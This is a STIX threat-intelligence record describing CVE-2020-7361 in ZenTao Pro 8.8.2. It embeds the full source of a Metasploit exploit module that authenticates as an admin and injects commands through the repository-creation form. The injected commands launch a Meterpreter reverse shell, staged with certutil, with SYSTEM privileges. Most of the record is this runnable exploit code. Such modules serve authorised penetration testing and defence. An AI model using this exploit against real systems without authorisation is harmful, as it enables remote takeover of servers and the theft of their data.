{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7757441a-0f69-4158-b1c6-639a021a2c36",
    "created": "2024-08-14T16:52:56.742099Z",
    "modified": "2024-08-14T16:52:56.742103Z",
    "name": "ZenTao Pro 8.8.2 Remote Code Execution",
    "description": " This module exploits a command injection vulnerability in ZenTao Pro 8.8.2 and earlier versions in order to execute arbitrary commands with SYSTEM privileges.  The module first attempts to authenticate to the ZenTao dashboard. It then tries to execute the payload by submitting fake repositories via the 'Repo Create' function that is accessible from the dashboard via CI>Repo. More precisely, the module sends HTTP POST requests to '/pro/repo-create.html' that inject commands in the vulnerable 'path' parameter which corresponds to the 'Client Path' input field.  Valid credentials for a ZenTao admin account are required. This module has been successfully tested against ZenTao 8.8.1 and 8.8.2 running on Windows 10 (XAMPP server).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/zentao_pro_rce.rb",
            "external_id": "zentao_pro_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-7361"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ZenTao Pro 8.8.2 Remote Code Execution',\n        'Description' => %q{\n          This module exploits a command injection vulnerability in ZenTao Pro\n          8.8.2 and earlier versions in order to execute arbitrary commands with\n          SYSTEM privileges.\n\n          The module first attempts to authenticate to the ZenTao dashboard. It\n          then tries to execute the payload by submitting fake repositories via\n          the 'Repo Create' function that is accessible from the dashboard via\n          CI>Repo. More precisely, the module sends HTTP POST requests to\n          '/pro/repo-create.html' that inject commands in the vulnerable 'path'\n          parameter which corresponds to the 'Client Path' input field.\n\n          Valid credentials for a ZenTao admin account are required. This module\n          has been successfully tested against ZenTao 8.8.1 and 8.8.2 running on\n          Windows 10 (XAMPP server).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Daniel Monz\u00f3n', # Discovery\n          'Melvin Boers', # PoC\n          'Erik Wynter' # @wyntererik - Metasploit\n        ],\n        'References' => [\n          ['EDB', '48633'], # PoC\n          ['CVE', '2020-7361']\n        ],\n        'Platform' => 'win',\n        'Targets' => [\n          [\n            'Windows (x86)', {\n              'Arch' => [ARCH_X86],\n              'CmdStagerFlavor' => :certutil,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows (x64)', {\n              'Arch' => [ARCH_X64],\n              'CmdStagerFlavor' => :certutil,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-06-20'\n      )\n    )\n\n    register_options [\n      OptString.new('TARGETURI', [true, 'The base path to ZenTao', '/pro/']),\n      OptString.new('TARGETPATH', [true, 'The path on the target where commands will be executed', 'C:\\\\Windows\\\\Temp']),\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', ''])\n    ]\n  end\n\n  def check\n    vprint_status('Running check')\n\n    # visit login the page to get the necessary cookies\n    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'user-login.html')\n    unless res\n      return CheckCode::Unknown('Connection failed')\n    end\n\n    cookie = res.get_cookies\n    if cookie.blank?\n      return CheckCode::Unknown('Unable to retrieve HTTP cookie header')\n    end\n\n    # check if the language is set to English, otherwise change it to English\n    unless cookie.scan(/lang=(.*?);/).flatten.first == 'en-US'\n      cookie.gsub!(/lang=(.*?);/, 'lang=en;')\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'score-ajax-selectLang.html'),\n        'cookie' => cookie\n      })\n\n      unless res\n        return CheckCode::Unknown('Connection failed')\n      end\n\n      @cookie = res.get_cookies\n      if @cookie.blank?\n        return CheckCode::Unknown('Unable to change the application language to English. Target may not be a ZenTao application')\n      end\n    end\n\n    # visit login page to check ZenTao version\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'user-login.html'),\n      'cookie' => @cookie\n    })\n\n    unless res\n      return CheckCode::Unknown('Connection failed')\n    end\n\n    unless res.code == 200 && res.body.include?('Login - ZenTao')\n      return CheckCode::Safe('Target is not a ZenTao application.')\n    end\n\n    # obtain cookie and random value necessary to autenticate later\n    @cookie = res.get_cookies\n    retrieve_rand_val(res)\n    if @cookie.blank? || @random_value.blank?\n      return CheckCode::Unknown('Unable to obtain the tokens required for authentication')\n    end\n\n    # obtain version\n    version = res.body.scan(/v=pro(.*?)'/).flatten.first\n    if version.blank?\n      return CheckCode::Detected('Unable to obtain ZenTao version.')\n    end\n\n    @version = Rex::Version.new(version)\n\n    unless @version <= Rex::Version.new('8.8.2')\n      return CheckCode::Detected(\"Target is ZenTao version #{@version}.\")\n    end\n\n    return CheckCode::Appears(\"Target is ZenTao version #{@version}.\")\n  end\n\n  def retrieve_rand_val(res)\n    html = res.get_html_document\n    @random_value = html.at('input[@name=\"verifyRand\"]')['value']\n\n    fail_with(Failure::NotFound, 'Failed to retrieve token') unless @random_value\n  end\n\n  def login\n    login_uri = normalize_uri(target_uri.path, 'user-login.html')\n    unless @random_value\n      res = send_request_cgi('method' => 'GET', 'uri' => login_uri)\n      fail_with(Failure::UnexpectedReply, 'Unable to reach login page') unless res\n      @cookie = res.get_cookies\n      retrieve_rand_val(res)\n    end\n\n    # generate md5 hashes required for authentication\n    hashed_pass = Digest::MD5.hexdigest(datastore['PASSWORD'].to_s)\n    final_hash = Digest::MD5.hexdigest(\"#{hashed_pass}#{@random_value}\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => login_uri,\n      'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',\n      'cookie' => @cookie,\n      'headers' => {\n        'Referer' => \"#{ssl ? 'https' : 'http'}://#{peer}/#{login_uri}\",\n        'X-Requested-With' => 'XMLHttpRequest',\n        'Origin' => \"#{ssl ? 'https' : 'http'}://#{peer}\"\n      },\n      'vars_post' => {\n        'account' => datastore['USERNAME'],\n        'password' => final_hash,\n        'passwordStrength' => '1',\n        'referer' => '/pro/',\n        'verifyRand' => @random_value,\n        'KeepLogin' => '0'\n      }\n    })\n\n    unless res\n      fail_with(Failure::Disconnected, 'Connection failed')\n    end\n\n    unless res.code == 200 && res.body.include?('success')\n      fail_with(Failure::NoAccess, 'Failed to authenticate. Please check if you have set the correct username and password.')\n    end\n\n    # visit /pro/, which is required to get to the dashboard at /pro/my/\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path),\n      'cookie' => @cookie,\n      'headers' => {\n        'Upgrade-Insecure-Requests' => '1',\n        'Referer' => \"#{ssl ? 'https' : 'http'}://#{peer}/#{login_uri}\"\n      }\n    })\n\n    unless res && res.code == 302\n      fail_with(Failure::NoAccess, 'Failed to authenticate.')\n    end\n\n    # finally visit /pro/my/ and check if we have been authenticated\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'my'),\n      'cookie' => @cookie\n    })\n    unless res && res.code == 200 && res.body.include?('Dashboard - ZenTao')\n      fail_with(Failure::NoAccess, 'Failed to authenticate.')\n    end\n    print_good(\"Successfully authenticated to ZenTao #{@version}.\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    cmd << ' &&' # this is necessary for compatibility with x86 targets (for x64 the module also works without this)\n    repo_uri = normalize_uri(target_uri.path, 'repo-create')\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => repo_uri,\n      'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',\n      'cookie' => @cookie,\n      'headers' => {\n        'Accept' => 'application/json, text/javascript, */*; q=0.01',\n        'Referer' => \"#{ssl ? 'https' : 'http'}://#{peer}/#{repo_uri}\",\n        'X-Requested-With' => 'XMLHttpRequest',\n        'Origin' => \"#{ssl ? 'https' : 'http'}://#{peer}\"\n      },\n      'vars_post' => {\n        'SCM' => 'Git',\n        'name' => Rex::Text.rand_text_alpha_lower(6..10),\n        'path' => datastore['TARGETPATH'],\n        'encoding' => 'utf-8',\n        'client' => cmd\n      }\n    }, 0) # don't wait for a response from the target, otherwise the module will hang for a few seconds after executing the payload\n  end\n\n  def exploit\n    login\n    print_status('Executing the payload...')\n    execute_cmdstager(background: true)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-06-20",
    "x_mitre_platforms": [
        "win'"
    ]
}